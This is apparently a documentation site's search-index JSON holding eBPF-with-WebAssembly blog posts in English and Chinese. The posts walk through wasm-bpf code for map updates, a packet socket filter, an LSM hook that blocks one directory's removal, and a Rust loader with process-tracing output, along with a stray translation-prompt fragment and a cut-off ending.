bpf_map_delete_elem(fd, &amp;next_key);\n        ...\n        lookup_key = next_key;\n    }\n```\".Instructions: Translate the following Chinese text to English \nwhile maintaining the original formatting: \"When running wasm code, shared memory will be used to access the kernel map. The kernel space can directly copy data to the stack of the Wasm virtual machine in user space, without the additional copy overhead between the user space host program and the Wasm runtime. Similarly, for type definitions shared between the Wasm virtual machine and the kernel space, careful checking is required to ensure that they have consistent types in both Wasm and kernel space.\n\nThe `bpf_map_update_elem` function can be used to update the eBPF map in user space programs to update the kernel's eBPF map, for example:\n\n```c\n        cg_map_fd = bpf_map__fd(obj-&gt;maps.cgroup_map);\n        cgfd = open(env.cgroupspath, O_RDONLY);\n        if (cgfd &lt; 0) {\n            ...\n        }\n        if (bpf_map_update_elem(cg_map_fd, &amp;idx, &amp;cgfd, BPF_ANY)) {\n            ...\n        }\n</code></pre> <p>Therefore, the eBPF program in the kernel can obtain configurations from the Wasm program side, or receive messages during runtime.</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#more-examples-socket-filter-and-lsm","title":"More examples: socket filter and LSM","text":"<p>In the repository, we also provide more examples, such as using socket filters to monitor and filter packets:</p> <pre><code>SEC(\"socket\")\nint socket_handler(struct __sk_buff *skb)\n{\n    struct so_event *e;\n    __u8 verlen;\n    __u16 proto;\n    __u32 nhoff = ETH_HLEN;\n\n    bpf_skb_load_bytes(skb, 12, &amp;proto, 2);\n    ...\n\n    bpf_skb_load_bytes(skb, nhoff + 0, &amp;verlen, 1);\n    bpf_skb_load_bytes(skb, nhoff + ((verlen &amp; 0xF) &lt;&lt; 2), &amp;(e-&gt;ports), 4);\n    e-&gt;pkt_type = skb-&gt;pkt_type;\n    e-&gt;ifindex = skb-&gt;ifindex;\n    bpf_ringbuf_submit(e, 0);\n\n    return skb-&gt;len;\n}\n</code></pre> <p>Linux Security Modules (LSM) is a hook-based framework for implementing security policies and mandatory access control in the Linux kernel. Until now, there have been two choices for enforcing security policy goals: configuring existing LSM modules (such as AppArmor and SELinux) or writing custom kernel modules.</p> <p>Linux Kernel 5.7 introduces a third option: LSM eBPF. LSM BPF allows developers to write custom policies without configuring or loading kernel modules. LSM BPF programs are verified at load time and then executed when reaching the LSM hook in the call path. For example, we can use LSM in a Wasm lightweight container to restrict file system operations:</p> <pre><code>// all lsm the hook point refer https://www.kernel.org/doc/html/v5.2/security/LSM.html\nSEC(\"lsm/path_rmdir\")\nint path_rmdir(const struct path *dir, struct dentry *dentry) {\n  char comm[16];\n  bpf_get_current_comm(comm, sizeof(comm));\n  unsigned char dir_name[] = \"can_not_rm\";\n  unsigned char d_iname[32];\n  bpf_probe_read_kernel(&amp;d_iname[0], sizeof(d_iname),\n                        &amp;(dir-&gt;dentry-&gt;d_iname[0]));\n\n  bpf_printk(\"comm %s try to rmdir %s\", comm, d_iname);\n  for (int i = 0;i&lt;sizeof(dir_name);i++){\n    if (d_iname[i]!=dir_name[i]){\n        return 0;\n    }\n  }\n  return -1;\n}\n</code></pre>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#summary","title":"Summary","text":"<p>In this example, we discuss how to use C/C++ language to write eBPF programs and compile them into Wasm modules. For more complete code, please refer to our GitHub repository: https://github.com/eunomia-bpf/wasm-bpf.</p> <p>In the next article, we will discuss how to write eBPF programs using Rust and compile them into Wasm modules. We will also cover using OCI images to publish, deploy, and manage eBPF programs, similar to the experience with Docker.</p> <p>Next, we will continue to improve the experience of developing and running eBPF programs in multiple languages within Wasm. We will provide more comprehensive examples, user-level development libraries/toolchains, and more specific use cases.</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#reference","title":"Reference","text":"<ul> <li>wasm-bpf GitHub repository: https://github.com/eunomia-bpf/wasm-bpf</li> <li>What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>Anolis Community eBPF Technology Exploration SIG: https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf project: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>eunomia-bpf project Anolis Gitee mirror: https://gitee.com/anolis/eunomia</li> <li>Wasm-bpf: Bridging the gap between WebAssembly and eBPF kernel programming: https://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>When WASM meets eBPF: Writing, distributing, loading, and running eBPF programs using WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>Teaching you how to use eBPF LSM to hotfix Linux kernel vulnerabilities: https://www.bilibili.com/read/cv19597563</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/","title":"\u5728 WebAssembly \u4e2d\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u53d1\u5e03 OCI \u955c\u50cf","text":"<p>\u4f5c\u8005\uff1a\u4e8e\u6850\uff0c\u90d1\u6631\u7b19</p> <p>eBPF\uff08extended Berkeley Packet Filter\uff09\u662f\u4e00\u79cd\u9ad8\u6027\u80fd\u7684\u5185\u6838\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u4e2d\uff0c\u4ee5\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u3002\u968f\u7740\u8ba1\u7b97\u673a\u6280\u672f\u7684\u4e0d\u65ad\u53d1\u5c55\uff0ceBPF \u7684\u529f\u80fd\u65e5\u76ca\u5f3a\u5927\uff0c\u5e76\u4e14\u5df2\u7ecf\u6210\u4e3a\u5404\u79cd\u6548\u7387\u9ad8\u6548\u7684\u5728\u7ebf\u8bca\u65ad\u548c\u8ddf\u8e2a\u7cfb\u7edf\uff0c\u4ee5\u53ca\u6784\u5efa\u5b89\u5168\u7684\u7f51\u7edc\u3001\u670d\u52a1\u7f51\u683c\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\u3002</p> <p>WebAssembly\uff08Wasm\uff09\u6700\u521d\u662f\u4ee5\u6d4f\u89c8\u5668\u5b89\u5168\u6c99\u76d2\u4e3a\u76ee\u7684\u5f00\u53d1\u7684\uff0c\u53d1\u5c55\u5230\u76ee\u524d\u4e3a\u6b62\uff0cWebAssembly \u5df2\u7ecf\u6210\u4e3a\u4e00\u4e2a\u7528\u4e8e\u4e91\u539f\u751f\u8f6f\u4ef6\u7ec4\u4ef6\u7684\u9ad8\u6027\u80fd\u3001\u8de8\u5e73\u53f0\u548c\u591a\u8bed\u8a00\u8f6f\u4ef6\u6c99\u7bb1\u73af\u5883\uff0cWasm \u8f7b\u91cf\u7ea7\u5bb9\u5668\u4e5f\u975e\u5e38\u9002\u5408\u4f5c\u4e3a\u4e0b\u4e00\u4ee3\u65e0\u670d\u52a1\u5668\u5e73\u53f0\u8fd0\u884c\u65f6\uff0c\u6216\u5728\u8fb9\u7f18\u8ba1\u7b97\u7b49\u8d44\u6e90\u53d7\u9650\u7684\u573a\u666f\u9ad8\u6548\u6267\u884c\u3002</p> <p>\u73b0\u5728\uff0c\u501f\u52a9 Wasm-bpf \u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Wasm \u5c06 eBPF \u7a0b\u5e8f\u7f16\u5199\u4e3a\u8de8\u5e73\u53f0\u7684\u6a21\u5757\uff0c\u4f7f\u7528 C/C++ \u548c Rust \u7f16\u5199\u7a0b\u5e8f\u3002\u901a\u8fc7\u5728 WebAssembly \u4e2d\u4f7f\u7528 eBPF \u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u4ec5\u8ba9 Wasm \u5e94\u7528\u83b7\u5f97 eBPF \u7684\u9ad8\u6027\u80fd\u3001\u5bf9\u7cfb\u7edf\u63a5\u53e3\u7684\u8bbf\u95ee\u80fd\u529b\uff0c\u8fd8\u53ef\u4ee5\u8ba9 eBPF \u7a0b\u5e8f\u4eab\u53d7\u5230 Wasm \u7684\u6c99\u7bb1\u3001\u7075\u6d3b\u6027\u3001\u8de8\u5e73\u53f0\u6027\u3001\u548c\u52a8\u6001\u52a0\u8f7d\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f7f\u7528 Wasm \u7684 OCI \u955c\u50cf\u6765\u65b9\u4fbf\u3001\u5feb\u6377\u5730\u5206\u53d1\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u7c7b\u4f3c docker \u4e00\u6837\uff0c\u4ece\u4e91\u7aef\u4e00\u884c\u547d\u4ee4\u83b7\u53d6 Wasm \u8f7b\u91cf\u7ea7\u5bb9\u5668\u955c\u50cf\uff0c\u5e76\u8fd0\u884c\u4efb\u610f eBPF \u7a0b\u5e8f\u3002\u901a\u8fc7\u7ed3\u5408\u8fd9\u4e24\u79cd\u6280\u672f\uff0c\u6211\u4eec\u5c06\u4f1a\u7ed9 eBPF \u548c Wasm \u751f\u6001\u6765\u4e00\u4e2a\u5168\u65b0\u7684\u5f00\u53d1\u4f53\u9a8c\uff01</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#wasm-bpf-wasm-ebpf","title":"\u4f7f\u7528 Wasm-bpf \u5de5\u5177\u94fe\u5728 Wasm \u4e2d\u7f16\u5199\u3001\u52a8\u6001\u52a0\u8f7d\u3001\u5206\u53d1\u8fd0\u884c eBPF \u7a0b\u5e8f","text":"<p>\u5728\u524d\u4e24\u7bc7\u77ed\u6587\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86 Wasm-bpf \u7684\u8bbe\u8ba1\u601d\u8def\uff0c\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528 C/C++ \u5728 Wasm \u4e2d\u7f16\u5199 eBPF \u7a0b\u5e8f:</p> <ul> <li>Wasm-bpf: \u67b6\u8d77 Webassembly \u548c eBPF \u5185\u6838\u53ef\u7f16\u7a0b\u7684\u6865\u6881: https://mp.weixin.qq.com/s/2InV7z1wcWic5ifmAXSiew</li> <li>\u5728 WebAssembly \u4e2d\u4f7f\u7528 C/C++ \u548c libbpf \u7f16\u5199 eBPF \u7a0b\u5e8f: https://zhuanlan.zhihu.com/p/605542090</li> </ul> <p>\u57fa\u4e8e Wasm\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\u6784\u5efa eBPF \u5e94\u7528\uff0c\u5e76\u4ee5\u7edf\u4e00\u3001\u8f7b\u91cf\u7ea7\u7684\u65b9\u5f0f\u7ba1\u7406\u548c\u53d1\u5e03\u3002\u4ee5\u6211\u4eec\u6784\u5efa\u7684\u793a\u4f8b\u5e94\u7528 bootstrap.wasm \u4e3a\u4f8b\uff0c\u4f7f\u7528 C/C++ \u6784\u5efa\u7684\u955c\u50cf\u5927\u5c0f\u6700\u5c0f\u4ec5\u4e3a ~90K\uff0c\u5f88\u5bb9\u6613\u901a\u8fc7\u7f51\u7edc\u5206\u53d1\uff0c\u5e76\u53ef\u4ee5\u5728\u4e0d\u5230 100ms \u7684\u65f6\u95f4\u5185\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u52a8\u6001\u90e8\u7f72\u3001\u52a0\u8f7d\u548c\u8fd0\u884c\uff0c\u5e76\u4e14\u4fdd\u7559\u8f7b\u91cf\u7ea7\u5bb9\u5668\u7684\u9694\u79bb\u7279\u6027\u3002\u8fd0\u884c\u65f6\u4e0d\u9700\u8981\u5185\u6838\u7279\u5b9a\u7248\u672c\u5934\u6587\u4ef6\u3001LLVM\u3001clang \u7b49\u4f9d\u8d56\uff0c\u4e5f\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u6d88\u8017\u8d44\u6e90\u7684\u91cd\u91cf\u7ea7\u7684\u7f16\u8bd1\u5de5\u4f5c\u3002\u5bf9\u4e8e Rust \u800c\u8a00\uff0c\u7f16\u8bd1\u4ea7\u7269\u4f1a\u7a0d\u5927\u4e00\u70b9\uff0c\u5927\u7ea6\u5728 2M \u5de6\u53f3\u3002</p> <p>\u672c\u6587\u5c06\u4ee5 Rust \u8bed\u8a00\u4e3a\u4f8b\uff0c\u8ba8\u8bba\uff1a</p> <ul> <li>\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757</li> <li>\u4f7f\u7528 OCI \u955c\u50cf\u53d1\u5e03\u3001\u90e8\u7f72\u3001\u7ba1\u7406 eBPF \u7a0b\u5e8f\uff0c\u83b7\u5f97\u7c7b\u4f3c Docker \u7684\u4f53\u9a8c</li> </ul> <p>\u6211\u4eec\u5728\u4ed3\u5e93\u4e2d\u63d0\u4f9b\u4e86\u51e0\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u5206\u522b\u5bf9\u5e94\u4e8e\u53ef\u89c2\u6d4b\u3001\u7f51\u7edc\u3001\u5b89\u5168\u7b49\u591a\u79cd\u573a\u666f\u3002</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#ebpf-wasm","title":"\u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u7684\u5927\u81f4\u6d41\u7a0b","text":"<p>\u4e00\u822c\u8bf4\u6765\uff0c\u5728\u975e Wasm \u6c99\u7bb1\u7684\u7528\u6237\u6001\u7a7a\u95f4\uff0c\u4f7f\u7528 libbpf-bootstrap \u811a\u624b\u67b6\uff0c\u53ef\u4ee5\u5feb\u901f\u3001\u8f7b\u677e\u5730\u4f7f\u7528 C/C++\u6784\u5efa BPF \u5e94\u7528\u7a0b\u5e8f\u3002\u7f16\u8bd1\u3001\u6784\u5efa\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff08\u65e0\u8bba\u662f\u91c7\u7528\u4ec0\u4e48\u8bed\u8a00\uff09\uff0c\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u7f16\u5199\u5185\u6838\u6001 eBPF \u7a0b\u5e8f\u7684\u4ee3\u7801\uff0c\u4e00\u822c\u4f7f\u7528 C/C++ \u6216 Rust \u8bed\u8a00</li> <li>\u4f7f\u7528 clang \u7f16\u8bd1\u5668\u6216\u8005\u76f8\u5173\u5de5\u5177\u94fe\u7f16\u8bd1 eBPF \u7a0b\u5e8f\uff08\u8981\u5b9e\u73b0\u8de8\u5185\u6838\u7248\u672c\u79fb\u690d\u7684\u8bdd\uff0c\u9700\u8981\u5305\u542b BTF \u4fe1\u606f\uff09\u3002</li> <li>\u5728\u7528\u6237\u6001\u7684\u5f00\u53d1\u7a0b\u5e8f\u4e2d\uff0c\u7f16\u5199\u5bf9\u5e94\u7684\u52a0\u8f7d\u3001\u63a7\u5236\u3001\u6302\u8f7d\u3001\u6570\u636e\u5904\u7406\u903b\u8f91\uff1b</li> <li>\u5728\u5b9e\u9645\u8fd0\u884c\u7684\u9636\u6bb5\uff0c\u4ece\u7528\u6237\u6001\u5c06 eBPF \u7a0b\u5e8f\u52a0\u8f7d\u8fdb\u5165\u5185\u6838\uff0c\u5e76\u5b9e\u9645\u6267\u884c\u3002</li> </ul>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#rust-ebpf-wasm","title":"\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm","text":"<p>Rust \u53ef\u80fd\u662f WebAssembly \u751f\u6001\u7cfb\u7edf\u4e2d\u652f\u6301\u6700\u597d\u7684\u8bed\u8a00\u3002Rust \u4e0d\u4ec5\u652f\u6301\u51e0\u4e2a WebAssembly \u7f16\u8bd1\u76ee\u6807\uff0c\u800c\u4e14 wasmtime\u3001Spin\u3001Wagi \u548c\u5176\u4ed6\u8bb8\u591a WebAssembly \u5de5\u5177\u90fd\u662f\u7528 Rust \u7f16\u5199\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86 Rust \u7684\u5f00\u53d1\u793a\u4f8b\uff1a</p> <ul> <li>Wasm \u548c WASI \u7684 Rust \u751f\u6001\u7cfb\u7edf\u975e\u5e38\u68d2</li> <li>\u8bb8\u591a Wasm \u5de5\u5177\u90fd\u662f\u7528 Rust \u7f16\u5199\u7684\uff0c\u8fd9\u610f\u5473\u7740\u6709\u5927\u91cf\u7684\u4ee3\u7801\u53ef\u4ee5\u590d\u7528\u3002</li> <li>Spin \u901a\u5e38\u5728\u5bf9\u5176\u4ed6\u8bed\u8a00\u7684\u652f\u6301\u4e4b\u524d\u5c31\u6709Rust\u7684\u529f\u80fd\u652f\u6301</li> <li>Wasmtime \u662f\u7528 Rust\u7f16\u5199\u7684\uff0c\u901a\u5e38\u5728\u5176\u4ed6\u8fd0\u884c\u65f6\u4e4b\u524d\u5c31\u6709\u6700\u5148\u8fdb\u7684\u529f\u80fd\u3002</li> <li>\u53ef\u4ee5\u5728 WebAssembly \u4e2d\u4f7f\u7528\u8bb8\u591a\u73b0\u6210\u7684 Rust \u5e93\u3002</li> <li>\u7531\u4e8e Cargo \u7684\u7075\u6d3b\u6784\u5efa\u7cfb\u7edf\uff0c\u4e00\u4e9b Crates \u751a\u81f3\u6709\u7279\u6b8a\u7684\u529f\u80fd\u6807\u5fd7\u6765\u542f\u7528Wasm\u7684\u529f\u80fd\uff08\u4f8b\u5982Chrono\uff09\u3002</li> <li>\u7531\u4e8e Rust \u7684\u5185\u5b58\u7ba1\u7406\u6280\u672f\uff0c\u4e0e\u540c\u7c7b\u8bed\u8a00\u76f8\u6bd4\uff0cRust \u7684\u4e8c\u8fdb\u5236\u5927\u5c0f\u5f88\u5c0f\u3002</li> </ul> <p>\u6211\u4eec\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u4e2a Rust \u7684 eBPF SDK\uff0c\u53ef\u4ee5\u4f7f\u7528 Rust \u7f16\u5199 eBPF \u7684\u7528\u6237\u6001\u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm\u3002\u501f\u52a9 aya-rs \u63d0\u4f9b\u7684\u76f8\u5173\u5de5\u5177\u94fe\u652f\u6301\uff0c\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u7528 Rust \u8fdb\u884c\u7f16\u5199\uff0c\u4e0d\u8fc7\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd8\u662f\u590d\u7528\u4e4b\u524d\u4f7f\u7528 C \u8bed\u8a00\u7f16\u5199\u7684\u5185\u6838\u6001\u7a0b\u5e8f\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 rust \u63d0\u4f9b\u7684 wasi \u5de5\u5177\u94fe\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9879\u76ee\uff1a</p> <pre><code>rustup target add wasm32-wasi\ncargo new rust-helloworld\n</code></pre> <p>\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>Makefile</code> \u8fd0\u884c make \u5b8c\u6210\u6574\u4e2a\u7f16\u8bd1\u6d41\u7a0b\uff0c\u5e76\u751f\u6210 <code>bootstrap.bpf.o</code> eBPF \u5b57\u8282\u7801\u6587\u4ef6\u3002</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#wit-bindgen-wasm","title":"\u4f7f\u7528 wit-bindgen \u751f\u6210\u7c7b\u578b\u4fe1\u606f\uff0c\u7528\u4e8e\u5185\u6838\u6001\u548c Wasm \u6a21\u5757\u4e4b\u95f4\u901a\u4fe1","text":"<p>wit-bindgen \u9879\u76ee\u662f\u4e00\u5957\u7740\u773c\u4e8e WebAssembly\uff0c\u5e76\u4f7f\u7528\u7ec4\u4ef6\u6a21\u578b\u7684\u8bed\u8a00\u7684\u7ed1\u5b9a\u751f\u6210\u5668\u3002\u7ed1\u5b9a\u662f\u7528 *.wit \u6587\u4ef6\u63cf\u8ff0\u7684\uff0c\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86 Wasm \u6a21\u5757\u5bfc\u5165\u3001\u5bfc\u51fa\u7684\u51fd\u6570\u548c\u63a5\u53e3\u3002\u6211\u4eec\u53ef\u4ee5 wit-bindgen \u5b83\u6765\u751f\u6210\u591a\u79cd\u8bed\u8a00\u7684\u7c7b\u578b\u5b9a\u4e49\uff0c\u4ee5\u4fbf\u5728\u5185\u6838\u6001\u7684 eBPF \u548c\u7528\u6237\u6001\u7684 Wasm \u6a21\u5757\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u3002</p> <p>\u6211\u4eec\u9996\u5148\u9700\u8981\u5728 <code>Cargo.toml</code> \u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165 <code>wasm-bpf-binding</code> \u548c <code>wit-bindgen-guest-rust</code> \u4f9d\u8d56\uff1a</p> <pre><code>wasm-bpf-binding = { path = \"wasm-bpf-binding\" }\n</code></pre> <p>\u8fd9\u4e2a\u5305\u63d0\u4f9b\u4e86 wasm-bpf \u7531\u8fd0\u884c\u65f6\u63d0\u4f9b\u7ed9 Wasm \u6a21\u5757\uff0c\u7528\u4e8e\u52a0\u8f7d\u548c\u63a7\u5236 eBPF \u7a0b\u5e8f\u7684\u51fd\u6570\u7684\u7ed1\u5b9a\u3002</p> <ul> <li><code>wasm-bpf-binding</code> \u5728 wasm-bpf \u4ed3\u5e93\u4e2d\u6709\u63d0\u4f9b\u3002</li> </ul> <pre><code>[dependencies]\nwit-bindgen-guest-rust = { git = \"https://github.com/bytecodealliance/wit-bindgen\", version = \"0.3.0\" }\n\n[patch.crates-io]\nwit-component = {git = \"https://github.com/bytecodealliance/wasm-tools\", version = \"0.5.0\", rev = \"9640d187a73a516c42b532cf2a10ba5403df5946\"}\nwit-parser = {git = \"https://github.com/bytecodealliance/wasm-tools\", version = \"0.5.0\", rev = \"9640d187a73a516c42b532cf2a10ba5403df5946\"}\n</code></pre> <p>\u8fd9\u4e2a\u5305\u652f\u6301\u7528 wit \u6587\u4ef6\u4e3a rust \u5ba2\u6237\u7a0b\u5e8f\u751f\u6210\u7ed1\u5b9a\u3002\u4f7f\u7528\u8fd9\u4e2a\u5305\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u518d\u624b\u52a8\u8fd0\u884c wit-bindgen\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u4f7f\u7528 <code>btf2wit</code> \u5de5\u5177\uff0c\u4ece BTF \u4fe1\u606f\u751f\u6210 wit \u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528 <code>cargo install btf2wit</code> \u5b89\u88c5\u6211\u4eec\u63d0\u4f9b\u7684 btf2wit \u5de5\u5177\uff0c\u5e76\u7f16\u8bd1\u751f\u6210 wit \u4fe1\u606f\uff1a</p> <pre><code>cd btf\nclang -target bpf -g event-def.c -c -o event.def.o\nbtf2wit event.def.o -o event-def.wit\ncp *.wit ../wit/\n</code></pre> <ul> <li>\u5176\u4e2d <code>event-def.c</code> \u662f\u5305\u542b\u4e86\u6211\u4eec\u9700\u8981\u7684\u7ed3\u6784\u4f53\u4fe1\u606f\u7684\u7684 C \u7a0b\u5e8f\u6587\u4ef6\u3002\u53ea\u6709\u5728\u5bfc\u51fa\u7b26\u53f7\u4e2d\u7528\u5230\u7684\u7ed3\u6784\u4f53\u624d\u4f1a\u88ab\u8bb0\u5f55\u5728 BTF \u4e2d\u3002</li> </ul> <p>\u5bf9\u4e8e C \u7ed3\u6784\u4f53\u751f\u6210\u7684 wit \u4fe1\u606f\uff0c\u5927\u81f4\u5982\u4e0b\uff1a</p> <pre><code>default world host {\n    record event {\n         pid: s32,\n        ppid: s32,\n        exit-code: u32,\n        --pad0: list&lt;s8&gt;,\n        duration-ns: u64,\n        comm: list&lt;s8&gt;,\n        filename: list&lt;s8&gt;,\n        exit-event: s8,\n    }\n}\n</code></pre> <p><code>wit-bindgen-guest-rust</code> \u4f1a\u4e3a wit \u6587\u4ef6\u5939\u4e2d\u7684\u6240\u6709\u7c7b\u578b\u4fe1\u606f\uff0c\u81ea\u52a8\u751f\u6210 rust \u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a</p> <pre><code>#[repr(C, packed)]\n#[derive(Debug, Copy, Clone)]\nstruct Event {\n    pid: i32,\n    ppid: i32,\n    exit_code: u32,\n    __pad0: [u8; 4],\n    duration_ns: u64,\n    comm: [u8; 16],\n    filename: [u8; 127],\n    exit_event: u8,\n}\n</code></pre>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E4%BD%BF%E7%94%A8-rust-%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%B9%B6%E5%8F%91%E5%B8%83-oci-%E9%95%9C%E5%83%8F/#_1","title":"\u7f16\u5199\u7528\u6237\u6001\u52a0\u8f7d\u548c\u5904\u7406\u4ee3\u7801","text":"<p>\u4e3a\u4e86\u5728 WASI \u4e0a\u8fd0\u884c\uff0c\u9700\u8981\u4e3a main.rs \u6dfb\u52a0 <code>#![no_main]</code> \u5c5e\u6027\uff0c\u5e76\u4e14 main \u51fd\u6570\u9700\u8981\u91c7\u7528\u7c7b\u4f3c\u5982\u4e0b\u7684\u5f62\u6001\uff1a</p> <pre><code>#[export_name = \"__main_argc_argv\"]\nfn exam_main(_env_json: u32, _str_len: i32) -&gt; i32 {\n\n    return 0;\n}\n</code></pre> <p>\u7528\u6237\u6001\u52a0\u8f7d\u548c\u6302\u8f7d\u4ee3\u7801\uff0c\u548c C/C++ \u4e2d\u7c7b\u4f3c\uff1a</p> <p>```rust,ignore     let obj_ptr =         binding::wasm_load_bpf_object(bpf_object.as_ptr() as u32, bpf_object.len() as i32);     if obj_ptr == 0 {         println!(\"Failed to load bpf object\");         return 1;     }     let attach_result = binding::wasm_attach_bpf_program(         obj_ptr,         \"handle_exec\\0\".as_ptr() as u32,         \"\\0\".as_ptr() as u32,     );     .. <pre><code>polling ring buffer\uff1a\n\n```rust,ignore\n    let map_fd = binding::wasm_bpf_map_fd_by_name(obj_ptr, \"rb\\0\".as_ptr() as u32);\n    if map_fd &lt; 0 {\n        println!(\"Failed to get map fd: {}\", map_fd);\n        return 1;\n    }\n    // binding::wasm\n    let buffer = [0u8; 256];\n    loop {\n        // polling the buffer\n        binding::wasm_bpf_buffer_poll(\n            obj_ptr,\n            map_fd,\n            handle_event as i32,\n            0,\n            buffer.as_ptr() as u32,\n            buffer.len() as i32,\n            100,\n        );\n    }\n</code></pre></p> <p>\u4f7f\u7528 handler \u63a5\u6536\u8fd4\u56de\u503c\uff1a</p> <p>```rust,ignore</p> <p>extern \"C\" fn handle_event(_ctx: u32, data: u32, _data_sz: u32) {     let event_slice = unsafe { slice::from_raw_parts(data as const Event, 1) };     let event = &amp;event_slice[0];     let pid = event.pid;     let ppid = event.ppid;     let exit_code = event.exit_code;     if event.exit_event == 1 {         print!(             \"{:&lt;8} {:&lt;5} {:&lt;16} {:&lt;7} {:&lt;7} [{}]\",             \"TIME\",             \"EXIT\",             unsafe { CStr::from_ptr(event.comm.as_ptr() as const i8) }                 .to_str()                 .unwrap(),             pid,             ppid,             exit_code         );         .. } <pre><code>\u63a5\u4e0b\u6765\u5373\u53ef\u4f7f\u7528 cargo \u7f16\u8bd1\u8fd0\u884c\uff1a\n\n```console\n$ cargo build --target wasi32-wasm\n$ sudo wasm-bpf ./target/wasm32-wasi/debug/rust-helloworld.wasm\nTIME     EXEC  sh               180245  33666   /bin/sh\nTIME     EXEC  which            180246  180245  /usr/bin/which\nTIME     EXIT  which            180246  180245  [0] (1ms)\nTIME     EXIT  sh               180245  33666   [0] (3ms)\nTIME     EXEC  sh               180247  33666   /bin/sh\nTIME     EXEC  ps               180248  180247  /usr/bin/ps\nTIME     EXIT  ps               180248  180247  [0] (23ms)\nTIME     EXIT  sh               180247  33666   [0] (25ms)\nTIME     EXEC  sh               180249  33666   /bin/sh\nTIME     EXEC  cpuUsage.sh      180250  180249  